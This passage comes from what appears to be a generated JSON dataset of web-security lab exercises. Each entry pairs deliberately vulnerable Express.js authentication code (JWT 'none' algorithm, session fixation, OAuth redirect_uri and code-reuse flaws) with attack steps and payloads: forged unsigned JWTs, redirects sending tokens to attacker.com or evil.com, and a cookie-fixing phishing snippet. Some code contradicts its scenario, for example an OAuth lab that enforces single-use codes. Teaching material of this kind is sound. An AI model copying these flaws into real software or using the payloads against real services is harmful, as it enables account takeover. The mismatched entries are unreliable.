    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = { alice: 'user', admin: 'admin' }; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username, role: users[username] }, 'supersecret', { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin-panel', (req, res) => { const authHeader = req.headers['authorization']; const token = authHeader && authHeader.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = jwt.decode(token); if (payload.role === 'admin') return res.send('Admin panel access granted'); } try { const verified = jwt.verify(token, 'supersecret'); if (verified.role === 'admin') return res.send('Admin panel access granted'); } catch (err) { return res.status(403).send('Access denied'); } res.status(403).send('Access denied'); }); app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.",
      "Authorization: Bearer <forged_none_jwt_token>"
    ]
  },
  {
    "Lab scenario": "Session fixation via cookie injection during login",
    "Lab Description": "The login flow accepts any session cookie provided by the user and binds it to the authenticated session. There is no session regeneration after login, allowing session fixation attacks. To solve: Fixate a session for the victim and hijack their session after they log in.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to create a crafted session ID like session=attacker123 and inject it in the login request headers.",
      "Send the crafted login request using your own credentials and confirm the session is tied to attacker123.",
      "Craft a phishing link pointing to the victim's login page, setting the session cookie as attacker123 using JavaScript or Burp Collaborator.",
      "Wait for the victim to log in using the fixated session ID (attacker123).",
      "Reuse attacker123 session ID to access /my-account and confirm access to the victim's session."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(express.urlencoded({ extended: true })); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'hunter2' }]; const sessions = {}; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); let sid = req.cookies.session || Math.random().toString(36).substring(2); sessions[sid] = username; res.cookie('session', sid); res.send('Login successful'); }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.session]; if (user) res.send('My Account: ' + user); else res.status(403).send('Forbidden'); }); app.listen(4000);",
    "payloads": [
      "Cookie: session=attacker123",
      "POST /login with attacker session injected",
      "Access /my-account with session=attacker123"
    ]
  },
  {
    "Lab scenario": "OAuth authorization code reuse flaw",
    "Lab Description": "The application integrates with an OAuth provider for login but fails to enforce single-use authorization codes. This allows an attacker to reuse a previously intercepted OAuth code to hijack a session. To solve: Reuse an intercepted authorization code to log in as the victim.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept an OAuth login request with a code parameter (e.g., /callback?code=123abc).",
      "Send the intercepted request to Burp Repeater and replay it to observe a valid session is still granted.",
      "Confirm the authorization server does not invalidate the code after the first use.",
      "Craft a phishing email or MITM attack to intercept a code from the victim's OAuth login flow.",
      "Replay the victim's intercepted code in /callback?code=xyz456 and gain access to their session."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const usedCodes = new Set(); const authCodes = { 'xyz456': 'carlos', '123abc': 'alice' }; const sessions = {}; app.get('/callback', (req, res) => { const { code } = req.query; if (usedCodes.has(code)) return res.status(403).send('Code already used'); if (authCodes[code]) { usedCodes.add(code); const sid = Math.random().toString(36).slice(2); sessions[sid] = authCodes[code]; res.cookie('session', sid); return res.send('Logged in as ' + authCodes[code]); } res.status(401).send('Invalid code'); }); app.get('/profile', (req, res) => { const user = sessions[req.cookies.session]; if (user) res.send('Profile: ' + user); else res.status(403).send('Not logged in'); }); app.listen(3000);",
    "payloads": [
      "/callback?code=123abc",
      "/callback?code=xyz456",
      "Intercepted and replayed OAuth authorization codes"
    ]
  },
  {
    "Lab scenario": "JWT tampering in Authorization header",
    "Lab Description": "This lab implements JWT-based authentication for accessing sensitive resources. The application verifies JWT tokens using a static secret but does not enforce the signing algorithm properly. To solve the lab, forge a valid JWT and access the admin panel without valid credentials.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Intercept a valid JWT token using Burp Suite by logging in as a regular user and capturing the Authorization header.",
      "2. Analyze the JWT structure at jwt.io and note the algorithm used in the header is 'HS256'.",
      "3. Modify the header to use 'none' and remove the signature part.",
      "4. In Burp Repeater, craft a tampered JWT with the payload {\"username\":\"admin\"}, set the header to {\"alg\":\"none\"}, and remove the signature.",
      "5. Replace the original token in the Authorization header with the forged token and send the request to /admin.",
      "6. Observe if the application grants access to the admin panel and validate lab completion."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'hardcodedsecret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, secret); res.json({ token }); }); app.get('/admin', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; try { const decoded = jwt.verify(token, secret); if (decoded.username === 'admin') res.send('Admin access granted'); else res.status(403).send('Forbidden'); } catch (err) { res.status(401).send('Invalid token'); } }); app.listen(4000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
      "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.DUMMY_SIGNATURE"
    ]
  },
  {
    "Lab scenario": "Session fixation via predictable session ID in SOAP API",
    "Lab Description": "The SOAP-based login service allows an attacker to define the session ID prior to authentication, leading to session fixation. The application does not regenerate session IDs upon login. To solve the lab, fix a session for the victim and hijack their account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. In Postman, send a crafted SOAP request to /soap-login including a sessionID element with a predictable value such as 'fixme1234'.",
      "2. Share this sessionID link with the victim to make them authenticate using the fixed session.",
      "3. After victim login, reuse the same sessionID in your cookie.",
      "4. Send a request to /user-panel with the fixed session ID in the cookie header.",
      "5. If session fixation worked, observe access to victim’s session data and confirm lab completion."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const cookieParser = require('cookie-parser'); const xmlparser = require('express-xml-bodyparser'); const app = express(); app.use(xmlparser()); app.use(cookieParser()); const sessions = {}; app.post('/soap-login', (req, res) => { const body = req.body['soapenv:Envelope']['soapenv:Body'][0]['ns1:LoginRequest'][0]; const username = body['username'][0]; const password = body['password'][0]; const sessionId = body['sessionID'][0]; if (username === 'carlos' && password === 'supersecure') { sessions[sessionId] = username; res.cookie('SID', sessionId); res.send('<response>Logged in</response>'); } else res.send('<response>Invalid</response>'); }); app.get('/user-panel', (req, res) => { const sid = req.cookies['SID']; if (sessions[sid]) res.send(`Welcome ${sessions[sid]}`); else res.status(403).send('Unauthorized'); }); app.listen(4001);",
    "payloads": [
      "<soapenv:Envelope xmlns:soapenv='http://schemas.xmlsoap.org/soap/envelope/'><soapenv:Body><ns1:LoginRequest xmlns:ns1='http://example.com/soap'><username>carlos</username><password>supersecure</password><sessionID>fixme1234</sessionID></ns1:LoginRequest></soapenv:Body></soapenv:Envelope>",
      "Cookie: SID=fixme1234"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration leaking access token in redirect",
    "Lab Description": "The application integrates OAuth login using a third-party provider but leaks the access token in the URL fragment after redirection. This token can be captured and reused. To solve the lab, obtain Carlos's access token from the redirect URL and use it to access his private data endpoint.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Initiate OAuth login as yourself and intercept the final redirect using Burp Suite.",
      "2. Observe the access_token is leaked in the fragment portion of the URL (after the #).",
      "3. Reflect on how this can be captured via open redirect or stored XSS.",
      "4. Trick Carlos into visiting a malicious link that captures his access token via JavaScript.",
      "5. Use Carlos's token in a GET /private-data?access_token=<token> request to retrieve his personal data.",
      "6. Confirm access to his private endpoint and solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const accessTokens = { 'carlos-token': 'carlos' }; app.get('/oauth/callback', (req, res) => { const token = req.query.token; res.redirect(`/home#access_token=${token}`); }); app.get('/private-data', (req, res) => { const token = req.query.access_token; if (accessTokens[token] === 'carlos') res.send('Sensitive data for carlos'); else res.status(403).send('Access denied'); }); app.listen(4002);",
    "payloads": [
      "https://malicious.com#access_token=carlos-token",
      "GET /private-data?access_token=carlos-token"
    ]
  },
  {
    "Lab scenario": "Session fixation via insecure session reuse in GraphQL login flow",
    "Lab Description": "The application's GraphQL login mutation does not issue new session tokens after authentication. Instead, it reuses any existing session token from unauthenticated users. This leads to a session fixation vulnerability. The application accepts session cookies before login and continues using them post-authentication without rotation. To solve: Fixate Carlos's session ID, then authenticate using his credentials and hijack his session.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Using OWASP ZAP or Burp Suite, intercept the POST /graphql request containing the login mutation and note the session cookie.",
      "2. Craft a request to POST /graphql that creates a session with a known cookie value (e.g., fixated-sessid) using a low-privilege account or anonymous user.",
      "3. Send this request repeatedly until the application issues a session using your specified fixated cookie.",
      "4. Trick the victim (Carlos) into logging in while his browser holds the fixated session cookie (e.g., via social engineering or image URL injection).",
      "5. Once Carlos authenticates, reuse the fixated session ID from your browser to access /my-account with elevated privileges."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const cookieParser = require('cookie-parser'); const app = express(); app.use(bodyParser.json()); app.use(cookieParser()); const users = { 'carlos': 'supersecret123', 'guest': 'guestpass' }; const sessions = {}; app.post('/graphql', (req, res) => { const query = req.body.query; if (query.includes('mutation Login')) { const { username, password } = JSON.parse(query.split('input:')[1].split(')')[0]); if (users[username] === password) { const sessId = req.cookies['sess'] || Math.random().toString(36).substring(2); sessions[sessId] = username; res.cookie('sess', sessId); return res.json({ data: { login: true } }); } else { return res.json({ errors: ['Invalid credentials'] }); } } res.json({ data: {} }); }); app.get('/my-account', (req, res) => { const sess = req.cookies['sess']; if (sessions[sess]) return res.send('Account: ' + sessions[sess]); res.status(403).send('Forbidden'); }); app.listen(3000);",
    "payloads": [
      "POST /graphql with cookie: sess=fixatedid",
      "mutation Login { login(input: { username: \"carlos\", password: \"supersecret123\" }) { success } }"
    ]
  },
  {
    "Lab scenario": "JWT 'none' algorithm manipulation in REST API authentication",
    "Lab Description": "The application uses stateless JWTs for authentication and accepts unsigned JWTs due to incorrect validation logic. By manipulating the 'alg' header of the JWT to 'none', an attacker can forge valid session tokens. The application fails to reject tokens that lack valid signatures. To solve: Forge an unsigned JWT that grants admin access and retrieve sensitive data from the /admin endpoint.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Log in normally via Postman and capture a valid JWT from the Authorization: Bearer header.",
      "2. Decode the JWT at jwt.io and note the header and payload.",
      "3. Modify the JWT header to: {\"alg\":\"none\"}, and change the payload to include \"role\":\"admin\".",
      "4. Remove the signature portion completely.",
      "5. Send a new request to GET /admin with Authorization: Bearer <forged_token>. If accepted, access will be granted."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const SECRET = 'secretkey123'; app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'admin' && password === 'adminpass') { const token = jwt.sign({ username, role: 'admin' }, SECRET); return res.json({ token }); } res.status(401).json({ error: 'Invalid login' }); }); app.get('/admin', (req, res) => { const auth = req.headers.authorization; if (!auth) return res.status(401).send('Missing token'); const token = auth.split(' ')[1]; try { const payload = jwt.verify(token, SECRET, { algorithms: ['HS256', 'none'] }); if (payload.role === 'admin') return res.send('Sensitive admin data'); res.status(403).send('Insufficient rights'); } catch (e) { res.status(400).send('Invalid token'); } }); app.listen(4000);",
    "payloads": [
      "Header: {\"alg\":\"none\"}",
      "Payload: {\"username\":\"admin\",\"role\":\"admin\"}",
      "JWT (no signature): <base64(header)>.<base64(payload)>."
    ]
  },
  {
    "Lab scenario": "OAuth implicit flow misconfiguration leading to token theft via redirect URI manipulation",
    "Lab Description": "The application integrates with a third-party OAuth provider but fails to validate redirect URIs properly in the implicit flow. An attacker can craft a malicious redirect URI pointing to their controlled domain, capturing the access token directly from the URL fragment. To solve: Capture Carlos's OAuth access token and use it to fetch his protected profile from /oauth/profile.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Analyze the OAuth login request using Burp Suite and note the response_type=token parameter indicating implicit flow.",
      "2. Modify the redirect_uri parameter to point to a controlled domain (e.g., https://attacker.com/callback) and trick Carlos into visiting the modified authorization URL.",
      "3. Capture the access token from the fragment (#access_token=...) once Carlos logs in.",
      "4. Use Postman to send GET /oauth/profile with Authorization: Bearer <stolen_token>.",
      "5. Confirm access to Carlos's data to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); const tokens = { 'carlos': 'abc123xyz456' }; app.get('/auth', (req, res) => { const { redirect_uri, response_type, username } = req.query; if (response_type === 'token') { const token = tokens[username]; const redirect = `${redirect_uri}#access_token=${token}`; return res.redirect(redirect); } res.status(400).send('Invalid request'); }); app.get('/oauth/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'abc123xyz456') return res.send('Carlos OAuth profile'); res.status(403).send('Invalid token'); }); app.listen(5000);",
    "payloads": [
      "GET /auth?response_type=token&redirect_uri=https://attacker.com/callback&username=carlos",
      "Extract #access_token from redirected URL",
      "GET /oauth/profile with Authorization: Bearer abc123xyz456"
    ]
  },
  {
    "Lab scenario": "Session Fixation in REST Login Flow",
    "Lab Description": "This lab simulates a flawed session management implementation where a session ID can be pre-assigned and accepted post-authentication. The application fails to invalidate existing session cookies on login. To solve: Hijack Carlos's session after successful login by forcing him to use your pre-assigned session ID.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite Proxy to capture your login request and observe the `Set-Cookie: sid=...` header.",
      "Send a crafted link to Carlos with the fixed session ID in the `Cookie` header using a phishing payload.",
      "Log in using your own credentials to ensure session ID does not change.",
      "Monitor for Carlos's session reuse using the pre-assigned session ID.",
      "Access `/my-account` using the hijacked session token to confirm access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'crimsonpass' }]; const sessions = {}; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { let sid = req.cookies.sid || 'sess' + Math.floor(Math.random() * 10000); sessions[sid] = username; res.cookie('sid', sid); res.send('Logged in'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.sid; const user = sessions[sid]; if (user) res.send(`Welcome ${user}`); else res.status(403).send('Access denied'); }); app.listen(3001);",
    "payloads": [
      "Cookie: sid=sess6666",
      "POST /login with pre-set sid cookie",
      "Access victim's /my-account with fixed sid"
    ]
  },
  {
    "Lab scenario": "JWT None Algorithm in Authorization Header",
    "Lab Description": "The application uses JWT tokens to authenticate GraphQL API requests, but fails to properly enforce the signing algorithm. The server accepts tokens signed with `alg: none`, allowing unauthorized access. To solve: Forge a token for Carlos and access his GraphQL user profile.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to capture an authenticated GraphQL request and extract the JWT from the Authorization header.",
      "Decode the JWT using jwt.io and modify the payload to impersonate 'carlos', setting `alg` to `none` in the header.",
      "Remove the signature part and craft a new Authorization header using the modified JWT.",
      "Send a POST request to `/graphql` with a valid query (e.g., `{ me { username, email } }`).",
      "Observe response showing Carlos's data to confirm the exploit."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = { carlos: { email: 'carlos@example.com', role: 'user' } }; app.post('/graphql', (req, res) => { const auth = req.headers.authorization; if (!auth) return res.status(401).send('No token'); const token = auth.split(' ')[1]; try { const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); req.user = payload; } else { jwt.verify(token, 'supersecret'); } } catch (e) { return res.status(401).send('Token error'); } res.json({ data: { me: users[req.user.username] } }); }); app.listen(3002);",
    "payloads": [
      "Authorization: Bearer <base64({alg: 'none'})>.<base64({username: 'carlos'})>.",
      "POST /graphql with { me { username } }",
      "Modified JWT token without signature"
    ]
  },
  {
    "Lab scenario": "OAuth Code Interception in Redirect URI",
    "Lab Description": "This lab features an OAuth authorization implementation vulnerable to redirect URI manipulation. The app accepts unvalidated redirect URIs and sends valid authorization codes to attacker-controlled endpoints. To solve: Intercept Carlos’s authorization code and exchange it for an access token to access his profile.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "In Burp Suite, initiate OAuth login and intercept the `/authorize?client_id=...` request.",
      "Modify the `redirect_uri` to point to your server (e.g., https://attacker.com/callback).",
      "Send the malicious link to Carlos to trigger OAuth login.",
      "Capture the `code` sent to your malicious callback endpoint.",
      "Manually exchange the code using Postman with a POST to `/oauth/token` to retrieve Carlos’s token.",
      "Use the token to send an authenticated GET request to `/profile` endpoint and view Carlos’s data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); const tokens = {}; app.get('/authorize', (req, res) => { const { client_id, redirect_uri, response_type } = req.query; if (response_type === 'code') { const code = 'authcode123'; tokens[code] = 'carlos'; res.redirect(`${redirect_uri}?code=${code}`); } else { res.status(400).send('Invalid response type'); } }); app.post('/token', (req, res) => { const { code } = req.body; const user = tokens[code]; if (user) { res.json({ access_token: `token-${user}`, token_type: 'bearer' }); } else { res.status(400).send('Invalid code'); } }); app.get('/profile', (req, res) => { const auth = req.headers.authorization; if (auth === 'Bearer token-carlos') res.send('Carlos Profile Data'); else res.status(403).send('Unauthorized'); }); app.listen(3003);",
    "payloads": [
      "https://vulnerable.com/authorize?client_id=abc&redirect_uri=https://attacker.com/callback",
      "POST /token with code=authcode123",
      "Authorization: Bearer token-carlos"
    ]
  },
  {
    "Lab scenario": "JWT None algorithm tampering in Authorization header",
    "Lab Description": "The application uses JWT for authorization, but improperly handles the 'alg' field in tokens. The application accepts JWTs with the 'alg' value set to 'none', leading to signature bypass. To solve: forge a JWT for the admin user and access their protected dashboard.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite to intercept an authenticated request and extract the JWT token from the Authorization header.",
      "2. Decode the JWT token using jwt.io or Burp Decoder to analyze its payload and algorithm.",
      "3. Modify the 'alg' field to 'none' and change the 'sub' claim to 'admin'. Remove the signature part entirely.",
      "4. Replace the original Authorization header with the modified JWT: 'Authorization: Bearer <forged_token>' using Burp Repeater.",
      "5. Send the request to the protected /admin endpoint and confirm successful access to the admin dashboard."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const secret = 'supersecret'; app.get('/admin', (req, res) => { const auth = req.headers.authorization; if (!auth) return res.status(401).send('No token'); const token = auth.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload.header.alg === 'none') { const decoded = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (decoded.sub === 'admin') return res.send('Welcome, admin'); return res.status(403).send('Forbidden'); } try { const verified = jwt.verify(token, secret); if (verified.sub === 'admin') return res.send('Welcome, admin'); else return res.status(403).send('Forbidden'); } catch { return res.status(400).send('Invalid token'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT None Algorithm Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.",
      "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9."
    ]
  },
  {
    "Lab scenario": "OAuth implicit flow misconfiguration in redirect_uri validation",
    "Lab Description": "The application implements OAuth 2.0 using the implicit grant flow but improperly validates the 'redirect_uri' parameter. This flaw allows redirection-based token theft. To solve: intercept and steal a victim's token by exploiting open redirect behavior.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use OWASP ZAP to spider the app and find an OAuth flow starting with /auth endpoint.",
      "2. Identify that the app uses implicit flow via response_type=token and passes a redirect_uri parameter.",
      "3. Craft a malicious redirect_uri pointing to a domain you control (e.g., https://attacker.com/catch#token).",
      "4. Trick a victim into clicking a login URL with your malicious redirect_uri.",
      "5. Capture the access_token in the fragment part of the redirected URL at attacker.com.",
      "6. Replay the access_token in an Authorization header to access the victim's profile."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const tokens = { 'carlos': 'abc123token' }; app.get('/auth', (req, res) => { const { client_id, redirect_uri, response_type } = req.query; if (!client_id || !redirect_uri || response_type !== 'token') return res.status(400).send('Invalid request'); const user = 'carlos'; const accessToken = tokens[user]; res.redirect(`${redirect_uri}#access_token=${accessToken}&token_type=bearer`); }); app.get('/profile', (req, res) => { const auth = req.headers.authorization; if (!auth) return res.status(401).send('No token'); const token = auth.split(' ')[1]; if (token === tokens['carlos']) return res.send('Carlos Profile Page'); res.status(403).send('Invalid token'); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Implicit Flow Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "https://vulnerable.app/auth?client_id=123&redirect_uri=https://attacker.com/catch&response_type=token",
      "Authorization: Bearer abc123token"
    ]
  },
  {
    "Lab scenario": "Session fixation via static session identifier in login flow",
    "Lab Description": "The application fails to issue a new session ID after login, making it vulnerable to session fixation. An attacker can set a known session ID before login and force the victim to use it. To solve: hijack Carlos's session by fixing a session ID pre-authentication.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite to intercept your own login and observe that the session cookie remains unchanged before and after authentication.",
      "2. Craft a phishing page or email to lure Carlos into logging in while having a pre-set session cookie (e.g., session=attacker123).",
      "3. Set the session cookie manually in Burp Repeater and simulate login as Carlos from the victim side.",
      "4. On the attacker side, send a request using the same fixed session ID: Cookie: session=attacker123.",
      "5. Access Carlos's account page using the hijacked session to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = { 'carlos': 'qwerty123' }; const sessions = {}; app.post('/login', (req, res) => { const { username, password } = req.query; const sess = req.cookies.session || 'anonymous'; if (users[username] === password) { sessions[sess] = username; res.send('Logged in'); } else { res.status(401).send('Invalid'); } }); app.get('/account', (req, res) => { const sess = req.cookies.session; if (sessions[sess] === 'carlos') res.send('Carlos Account'); else res.status(403).send('Unauthorized'); }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "Cookie: session=attacker123",
      "POST /login?username=carlos&password=qwerty123",
      "GET /account with Cookie: session=attacker123"
    ]
  },
  {
    "Lab scenario": "Session Fixation in REST Login Flow",
    "Lab Description": "This lab is vulnerable to session fixation. The application sets a session cookie before authentication and does not issue a new one after login. To solve: hijack Carlos's session using a fixed session ID and access his account dashboard.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1.Using Burp Suite, send a GET request to /login to receive a session cookie before authentication.",
      "2.Use Burp Repeater to send a crafted login POST request with valid credentials and the pre-issued session ID.",
      "3.Observe that the session ID remains unchanged post-authentication.",
      "4.Share the fixed session ID with Carlos (simulate XSS or phishing scenario) and have him authenticate using it.",
      "5.Use the same fixed session ID to access /dashboard and verify access to Carlos’s account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(session({ secret: 'fixed-session-secret', resave: false, saveUninitialized: true })); app.use(bodyParser.json()); const users = { carlos: 'letmein123' }; app.get('/login', (req, res) => { res.send('Login form'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] && users[username] === password) { req.session.authenticated = true; req.session.user = username; res.send('Logged in'); } else { res.status(401).send('Invalid'); } }); app.get('/dashboard', (req, res) => { if (req.session.authenticated) { res.send(`Welcome ${req.session.user}`); } else { res.status(403).send('Forbidden'); } }); app.listen(3000);",
    "payloads": [
      "GET /login",
      "POST /login {\"username\":\"carlos\",\"password\":\"letmein123\"} with session cookie manually set",
      "GET /dashboard with fixed session cookie"
    ]
  },
  {
    "Lab scenario": "JWT Signature Algorithm Confusion in GraphQL Auth",
    "Lab Description": "This GraphQL-based application uses JWTs for authentication. It accepts 'none' as the JWT algorithm and fails to validate the token signature. To solve: forge a token using 'none' algorithm and access Carlos's profile via a GraphQL query.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1.Use Postman to intercept a valid JWT after logging in with any user.",
      "2.Decode the JWT using jwt.io and inspect the 'alg' field.",
      "3.Replace the 'alg' with 'none' and change the payload to impersonate 'carlos'.",
      "4.Remove the signature part and re-encode the header and payload.",
      "5.Send a GraphQL request using the forged token in the Authorization header to access Carlos’s profile."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = { carlos: 'securepass' }; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { const token = jwt.sign({ user: username }, 'secret', { algorithm: 'HS256' }); res.json({ token }); } else { res.status(401).send('Invalid'); } }); app.post('/graphql', (req, res) => { const auth = req.headers.authorization; if (!auth) return res.status(401).send('No token'); const token = auth.replace('Bearer ', ''); try { const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = JSON.parse(Buffer.from(decoded.payload, 'base64').toString()); return res.send(`Welcome ${payload.user}`); } const verified = jwt.verify(token, 'secret'); res.send(`Welcome ${verified.user}`); } catch { res.status(403).send('Forbidden'); } }); app.listen(4000);",
    "payloads": [
      "JWT with header {\"alg\":\"none\"}",
      "Payload {\"user\":\"carlos\"}",
      "GraphQL POST: {\"query\":\"{ profile { name } }\"} with forged JWT"
    ]
  },
  {
    "Lab scenario": "OAuth Authorization Code Interception via Open Redirect",
    "Lab Description": "This OAuth integration leaks authorization codes via a poorly validated redirect_uri parameter. To solve: intercept Carlos’s OAuth code via open redirect and exchange it for an access token to view his profile.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1.Use Burp Suite to initiate an OAuth login flow and capture the redirect_uri parameter.",
      "2.Modify redirect_uri to point to your controlled domain (use collaborator or custom HTTP server).",
      "3.Phish Carlos into clicking the modified authorization URL.",
      "4.On code interception, exchange the stolen code at the /token endpoint to obtain an access token.",
      "5.Use the token in an API request to GET /api/profile and confirm access to Carlos’s data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); const tokens = {}; app.get('/authorize', (req, res) => { const { client_id, redirect_uri, response_type } = req.query; if (client_id === 'trusted' && response_type === 'code') { const code = 'oauthcode-carlos'; res.redirect(`${redirect_uri}?code=${code}`); } else { res.status(400).send('Invalid'); } }); app.post('/token', (req, res) => { const { code } = req.body; if (code === 'oauthcode-carlos') { const token = 'access-token-carlos'; tokens[token] = 'carlos'; res.json({ access_token: token }); } else { res.status(400).send('Invalid code'); } }); app.get('/api/profile', (req, res) => { const auth = req.headers.authorization; if (auth && tokens[auth.replace('Bearer ', '')]) { res.send(`Profile: ${tokens[auth.replace('Bearer ', '')]}`); } else { res.status(401).send('Unauthorized'); } }); app.listen(5000);",
    "payloads": [
      "GET /authorize?client_id=trusted&redirect_uri=http://evil.com/capture&response_type=code",
      "Intercepted Code: oauthcode-carlos",
      "POST /token with body {\"code\":\"oauthcode-carlos\"}",
      "GET /api/profile with Authorization: Bearer access-token-carlos"
    ]
  },
  {
    "Lab scenario": "Session Fixation in login endpoint via Cookie Parameter Injection",
    "Lab Description": "The application allows a session identifier to be set via a request cookie prior to authentication. This behavior allows an attacker to fixate a session and hijack the victim's account after they log in. The application accepts and reuses session tokens passed through cookies even before login. To solve: hijack Carlos's session post-login using a fixated session value.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1.Using Burp Suite, send a GET /login request with a custom session cookie (e.g., sessionId=attacker123).",
      "2.Log in using your own credentials and observe that the session cookie value persists post-authentication.",
      "3.Log out and craft a phishing link that sets sessionId=attacker123 in the victim’s browser using a Cookie injection or XSS simulation.",
      "4.After the victim logs in using the fixated session ID, capture the same sessionId value from your Burp proxy.",
      "5.Use the sessionId=attacker123 to access /my-account and verify account hijack."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const cookieParser = require('cookie-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'letmein' }]; const sessions = {}; app.post('/login', (req, res) => { const { username, password } = req.body; const sessionId = req.cookies.sessionId || Math.random().toString(36).substring(2); const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(403).send('Invalid login'); sessions[sessionId] = username; res.cookie('sessionId', sessionId); res.send('Logged in'); }); app.get('/my-account', (req, res) => { const username = sessions[req.cookies.sessionId]; if (username) res.send(`Welcome ${username}`); else res.status(401).send('Unauthorized'); }); app.listen(3000);",
    "payloads": [
      "Cookie: sessionId=attacker123",
      "Phishing link: <img src='http://vulnerable.site/login' onload='document.cookie=\"sessionId=attacker123\"'>"
    ]
  },
  {
